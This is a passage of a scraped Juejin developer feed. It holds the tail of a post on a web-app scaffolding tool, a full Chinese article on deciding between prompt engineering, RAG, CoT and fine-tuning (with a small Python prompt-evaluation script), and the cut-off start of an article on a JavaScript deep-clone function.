<li>模板服务：<code>template.js</code> 负责复制模板、打包器/语言适配、插件注入与代码转换。</li>
<li>插件注册表：<code>plugin-registry.js</code> 用“配置”声明插件的依赖、文件、转换，按 <code>framework/common</code> 分组。</li>
<li>打包器插件：
<ul>
<li><code>bundler-vite</code>：覆盖 <code>scripts</code>/依赖，透传 <code>@vitejs/plugin-react</code> 或 <code>@vitejs/plugin-vue</code>。</li>
<li><code>bundler-webpack</code>：写入 <code>webpack.config.js</code>（ESM）、<code>HtmlWebpackPlugin</code> 注入入口；移除 Vite 的 <code>&lt;script type="module"&gt;</code></li>
</ul>
</li>
</ul>
<h2 data-id="heading-6"><strong>END</strong></h2>
<ul>
<li>Star 支持：你的一个 Star，是我们持续打磨的动力</li>
<li>贡献插件/模板：在 <code>src/config/plugins</code> 与 <code>src/templates</code> 中新增或改进</li>
<li>提交 Issue/PR：欢迎修复问题、补文档、提功能建议</li>
</ul>
<p><strong>项目链接与文档</strong></p>
<ul>
<li>仓库：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fduchao-duchao%2Fcreate-web-app" target="_blank" title="https://github.com/duchao-duchao/create-web-app" ref="nofollow noopener noreferrer">github.com/duchao-duch…</a></li>
<li>文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fduchao-duchao.github.io%2Fcreate-web-app%2F" target="_blank" title="https://duchao-duchao.github.io/create-web-app/" ref="nofollow noopener noreferrer">duchao-duchao.github.io/create-web-…</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[怎么判断是自己prompt写的不够好？还是基座模型能力不够？]]></title>    <link>https://juejin.cn/post/7575910333400760374</link>    <guid>https://juejin.cn/post/7575910333400760374</guid>    <pubDate>2025-11-24T07:54:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575910333400760374" data-draft-id="7575910333400694838" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="怎么判断是自己prompt写的不够好？还是基座模型能力不够？"/> <meta itemprop="keywords" content="LLM"/> <meta itemprop="datePublished" content="2025-11-24T07:54:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="智泊AI"/> <meta itemprop="url" content="https://juejin.cn/user/3572727470361578"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            怎么判断是自己prompt写的不够好？还是基座模型能力不够？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3572727470361578/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    智泊AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T07:54:28.000Z" title="Mon Nov 24 2025 07:54:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>原作者：归来仍是少年</p>
<p>在大模型技术实际部署时，一个极具实践价值的核心问题在于：当前输出效果未达预期，究竟源于Prompt设计缺陷，还是模型固有能力的局限？</p>
<p>这一判断至关重要，它将直接影响后续技术路线的选择——是聚焦于Prompt优化、采用CoT（思维链）或RAG（检索增强生成）技术，还是需要投入成本进行SFT（监督微调）乃至RLHF（基于人类反馈的强化学习）。</p>
<h3 data-id="heading-0"><strong>一、先问自己：你的任务真的需要微调吗？</strong></h3>
<p>很多人一遇到问题就考虑微调，但实际‌80%‌的情况，通过‌prompt工程‌结合‌RAG‌和‌CoT‌技术完全能够应对。微调并非普适方案，其应用范围有严格界定。</p>
<p>行业实践表明，以下任务通常‌无需微调‌：</p>
<p><strong>‌通用问答‌</strong>（如客服FAQ、知识检索）：依赖RAG实时获取最新数据即可。</p>
<p><strong>‌结构化输出‌</strong>（如JSON、表格）：设计明确的prompt模板并辅以少量示例即可保证稳定性。</p>
<p><strong>‌多步推理‌</strong>（如数学推导、逻辑分析）：CoT或Self-Consistency等方法效果突出。</p>
<p><strong>‌风格适配‌</strong>（如邮件撰写、文案生成）：少量示例搭配system prompt足以胜任。</p>
<p>而必须微调的场景通常具备以下特征：</p>
<p><strong>‌专业术语密集‌</strong>（如医疗、法律、金融领域）：模型对专业术语的理解易出现偏差。</p>
<p><strong>‌定制化输出格式‌</strong>（如特定协议、内部DSL）：通用模型难以满足格式要求。</p>
<p><strong>‌严格行为约束‌</strong>（如拒绝特定请求、强制引用来源）：仅靠prompt容易失效。</p>
<p><strong>‌高性能需求‌</strong>（低延迟、高吞吐）：RAG或复杂prompt会显著影响响应速度。</p>
<p>因此，首要步骤是明确任务是否属于‌“必须微调”‌的范畴。</p>
<h3 data-id="heading-1"><strong>二、如何系统评估 prompt 是否还有优化空间？</strong></h3>
<p>假设你的任务确实复杂，但还不确定是否该微调。这时候可以做以下几件事：</p>
<h3 data-id="heading-2">1. <strong>构建“prompt 梯度测试”</strong></h3>
<p>不要只写一个 prompt 就下结论。你应该设计一个<strong>prompt 演进序列</strong>：</p>
<ul>
<li>Baseline：最简单的指令（如“请回答以下问题”）</li>
<li>加 system prompt（如“你是一个严谨的金融分析师”）</li>
<li>加 few-shot 示例（2~5 个高质量样例）</li>
<li>加 CoT 引导（如“请逐步推理”）</li>
<li>加输出约束（如“请用 JSON 格式，字段包括…”）</li>
</ul>
<p>然后在同一个测试集上跑这 5 个版本，看准确率/一致性是否显著提升。</p>
<p>以"从法律文书中识别核心条款"任务为例，基础prompt的准确率可能仅达到60%，但引入3个典型示例结合推理步骤（CoT）后，准确率可跃升至85%。此时进一步优化模型的收益空间已显著缩小。</p>
<h3 data-id="heading-3">2. <strong>检查模型是否“知道但不说”</strong></h3>
<p>有时候模型其实具备知识，但没被 prompt 激活。你可以用“探测性提问”验证：</p>
<ul>
<li>先问：“你知道 XX 概念吗？” → 如果回答“知道”，说明知识存在。</li>
<li>再问具体任务 → 如果答错，说明是 prompt 引导问题，不是能力问题。</li>
</ul>
<h3 data-id="heading-4">3. <strong>对比不同基座模型的表现</strong></h3>
<p>建议使用相同prompt在Qwen、DeepSeek、LongCat-Flash、GPT-4等模型上进行测试。</p>
<p>若所有模型表现不佳，则可能是prompt设计存在问题（例如任务描述不够清晰或缺乏约束条件）。</p>
<p>若仅目标模型表现较差，而GPT-4能完成任务，则表明基础模型能力存在局限，可能需要通过微调或更换更强大的基础模型来提升性能。</p>
<p>对于需要处理复杂指令的任务（如工具调用或多轮交互），LongCat-Flash 这类 MoE 架构模型展现出显著优势。</p>
<p>其总参数规模达 560B（激活参数约 27B），在 IFEval 测试中指令遵循得分高达 89.65%，性能超越 GPT-4.1。建议优先尝试此类强基座模型，而非直接进行微调。</p>
<h3 data-id="heading-5"><strong>三、RAG 和 CoT 能替代微调吗？</strong></h3>
<p>很多人忽略了 RAG 和 CoT 的潜力。</p>
<p>‌<strong>RAG 适合解决“知识缺失”问题</strong>：</p>
<p>当业务数据持续动态更新时（如每日新增），模型无法实现全量记忆存储。此时通过向量库检索相关片段并辅助生成，其效果显著优于微调方案（后者会因数据时效性导致性能下降）。</p>
<p><strong>‌CoT 适合解决“推理链断裂”问题</strong>：</p>
<p>面对数学推导、逻辑分析或代码编写等任务，强制模型展示分步思考过程可显著提升结果准确性。研究数据表明，采用CoT微调（基于含推理链的训练数据）的效果优于传统SFT方法。</p>
<p>典型实证案例：AIME数学竞赛题测试中，LongCat-Flash的avg@10指标为61.25，逼近Qwen3 MoE的68.33，并大幅领先GPT-4.1的32.00。</p>
<p>该成绩源于其多阶段训练中对推理能力的专项强化，特别是CoT数据的有效注入。</p>
<p>因此，在实施微调前需明确：</p>
<p>当前问题属于知识不足？推理能力欠缺？还是行为约束缺失？</p>
<ul>
<li>缺知识 → 用 RAG</li>
<li>缺推理 → 用 CoT / Self-Ask</li>
<li>缺行为约束 → 才考虑微调</li>
</ul>
<h3 data-id="heading-6"><strong>四、什么时候微调是不可避免的？</strong></h3>
<p>当同时满足以下所有条件时，微调才具备实际投入价值：‌</p>
<p>‌<strong>任务具有高度专业性‌</strong></p>
<p>例如医疗诊断、法律条文解析等场景，通用模型极易出现"权威性错误"（即看似专业实则谬误）。</p>
<p>‌<strong>Prompt优化已到瓶颈</strong></p>
<p>即使采用10组few-shot示例、CoT推理链或RAG增强，准确率仍无法突破70%阈值。</p>
<p><strong>有优质标注数据‌</strong></p>
<p>需准备数百至数千条经过严格清洗的input-output配对数据。</p>
<p><strong>‌对响应延迟要求严苛‌</strong></p>
<p>RAG的检索-生成流程耗时过长，无法满足实时业务需求。</p>
<p>此时建议采取以下策略：</p>
<p><strong>‌监督微调</strong>（SFT）‌：高效适配领域知识输出规范</p>
<p><strong>‌偏好优化</strong>（DPO/RLHF）‌：强化人类价值观对齐（如内容安全、表达自然度）</p>
<p>注意：微调可能引发‌过拟合‌、‌知识遗忘‌、‌推理延迟增加‌等风险，必须通过A/B测试验证效果。</p>
<h3 data-id="heading-7"><strong>五、一个实用决策流程图（文字版）</strong></h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d725d9d8e6b84c2fbc4b0988e398e005~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm65rOKQUk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764575667&amp;x-signature=6hvGm26g8u7MiAIfFJGTcYyeZcA%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-8"><strong>六、代码示例：如何自动化评估 prompt 效果</strong></h3>
<p>下面是一个简单的 Python 脚本框架，用于批量测试不同 prompt 的效果：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> openai <span class="hljs-keyword">import</span> OpenAI
<span class="hljs-keyword">import</span> json
client = OpenAI(api_key=<span class="hljs-string">"your-api-key"</span>, base_url=<span class="hljs-string">"https://api.longcat.ai/v1"</span>)
test_cases = [
    {<span class="hljs-string">"input"</span>: <span class="hljs-string">"从以下合同中提取甲方名称：..."</span>, <span class="hljs-string">"expected"</span>: <span class="hljs-string">"XX公司"</span>},
    <span class="hljs-comment"># ... 更多样例</span>
]
prompts = {
    <span class="hljs-string">"baseline"</span>: <span class="hljs-string">"请提取甲方名称：{text}"</span>,
    <span class="hljs-string">"cot"</span>: <span class="hljs-string">"请逐步分析合同内容，然后提取甲方名称：{text}"</span>,
    <span class="hljs-string">"few_shot"</span>: <span class="hljs-string">"""示例1：
合同：甲方为ABC科技，乙方为XYZ集团。
输出：ABC科技
示例2：
合同：本协议由甲方（123有限公司）与乙方签署。
输出：123有限公司
请提取甲方名称：{text}"""</span>
}
<span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_prompt</span>(<span class="hljs-params">prompt_template</span>):
    correct = <span class="hljs-number">0</span>
    <span class="hljs-keyword">for</span> <span class="hljs-keyword">case</span> <span class="hljs-keyword">in</span> test_cases:
        response = client.chat.completions.create(
            model=<span class="hljs-string">"longcat-flash-chat"</span>,
            messages=[{<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: prompt_template.<span class="hljs-built_in">format</span>(text=<span class="hljs-keyword">case</span>[<span class="hljs-string">"input"</span>])}]
        )
        pred = response.choices[<span class="hljs-number">0</span>].message.content.strip()
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">case</span>[<span class="hljs-string">"expected"</span>] <span class="hljs-keyword">in</span> pred:  <span class="hljs-comment"># 简单包含判断，实际可用更严谨的匹配</span>
            correct += <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> correct / <span class="hljs-built_in">len</span>(test_cases)
<span class="hljs-keyword">for</span> name, tmpl <span class="hljs-keyword">in</span> prompts.items():
    acc = evaluate_prompt(tmpl)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{name}</span>: <span class="hljs-subst">{acc:<span class="hljs-number">.2</span>%}</span>"</span>)
</code></pre>
<p>通过这个脚本，你可以量化不同 prompt 策略的效果，避免“感觉不好就微调”的误区。</p>
<h3 data-id="heading-9"><strong>结语</strong></h3>
<p>当前大模型的性能表现已显著提升，以LongCat-Flash为代表的MoE架构为例，其仅需激活27B参数即可在agentic任务中实现优于GPT-4.1的效果。这一现象揭示了一个关键事实：</p>
<p>‌多数被视为需要微调的场景，本质上是Prompt设计不当所致‌。</p>
<p>建议优先充分探索Prompt工程、RAG、CoT等无需训练成本的解决方案。仅当上述方法均无效，且具备充足数据与清晰目标时，微调才是最优解。</p>
<p>毕竟，<strong>最好的微调，是不用微调</strong>。</p>
<p>更多AI大模型学习视频及资源，都在<a href="https://link.juejin.cn?target=https%3A%2F%2Fyuan.zhipoai.cn%2F" target="_blank" title="https://yuan.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JS 对象深拷贝]]></title>    <link>https://juejin.cn/post/7575563462048301091</link>    <guid>https://juejin.cn/post/7575563462048301091</guid>    <pubDate>2025-11-24T07:25:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575563462048301091" data-draft-id="7575810396202663970" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JS 对象深拷贝"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T07:25:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="醒了接着睡"/> <meta itemprop="url" content="https://juejin.cn/user/2113684267875592"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JS 对象深拷贝
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2113684267875592/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    醒了接着睡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T07:25:01.000Z" title="Mon Nov 24 2025 07:25:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">创建深拷贝函数</h3>
<p>这个函数将处理：</p>
<ul>
<li>基本数据类型、对象和数组。</li>
<li><code>Date</code> 和 <code>RegExp</code> 对象。</li>
<li><strong>循环引用</strong>（防止无限递归导致栈溢出）。</li>
<li><code>Symbol</code> 类型的属性。</li>
<li>函数和 <code>undefined</code>。</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * 高性能递归深拷贝函数，处理循环引用和多种数据类型
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">any</span>} obj 要拷贝的对象
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">WeakMap</span>} hash 用于处理循环引用，防止栈溢出。默认为 new WeakMap()，外部调用时无需传递。
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">any</span>} 拷贝后的新对象
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">deepClone</span>(<span class="hljs-params">obj, hash = <span class="hljs-keyword">new</span> <span class="hljs-built_in">WeakMap</span>()</span>) {
  <span class="hljs-comment">// 1. 如果是 null 或非对象/函数类型，直接返回</span>
  <span class="hljs-keyword">if</span> (obj === <span class="hljs-literal">null</span> || <span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">'object'</span>) {
    <span class="hljs-keyword">return</span> obj;
  }

  <span class="hljs-comment">// 2. 处理特殊对象：Date 和 RegExp</span>
  <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Date</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(obj);
  }
  <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">RegExp</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(obj);
  }
  <span class="hljs-comment">// [新增] 支持 Set</span>
  <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Set</span>) {
    <span class="hljs-keyword">const</span> cloneSet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> value <span class="hljs-keyword">of</span> obj) {
      cloneSet.<span class="hljs-title function_">add</span>(<span class="hljs-title function_">deepClone</span>(value, hash));
    }
    <span class="hljs-keyword">return</span> cloneSet;
  }
  <span class="hljs-comment">// [新增] 支持 Map</span>
  <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Map</span>) {
    <span class="hljs-keyword">const</span> cloneMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, value] <span class="hljs-keyword">of</span> obj) {
      cloneMap.<span class="hljs-title function_">set</span>(<span class="hljs-title function_">deepClone</span>(key, hash), <span class="hljs-title function_">deepClone</span>(value, hash));
    }
    <span class="hljs-keyword">return</span> cloneMap;
  }

  <span class="hljs-comment">// 3. 处理循环引用：如果哈希表中已存在该对象，说明之前已经拷贝过，直接返回缓存中的拷贝结果</span>
  <span class="hljs-keyword">if</span> (hash.<span class="hljs-title function_">has</span>(obj)) {
    <span class="hljs-keyword">return</span> hash.<span class="hljs-title function_">get</span>(obj);
  }

  <span class="hljs-comment">// 4. 根据是数组还是对象，创建新的容器</span>
  <span class="hljs-comment">// 使用 obj.constructor 可以保留原型链上的属性，比 Array.isArray 或 {} 更健壮</span>
  <span class="hljs-keyword">const</span> cloneObj = <span class="hljs-keyword">new</span> obj.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>);

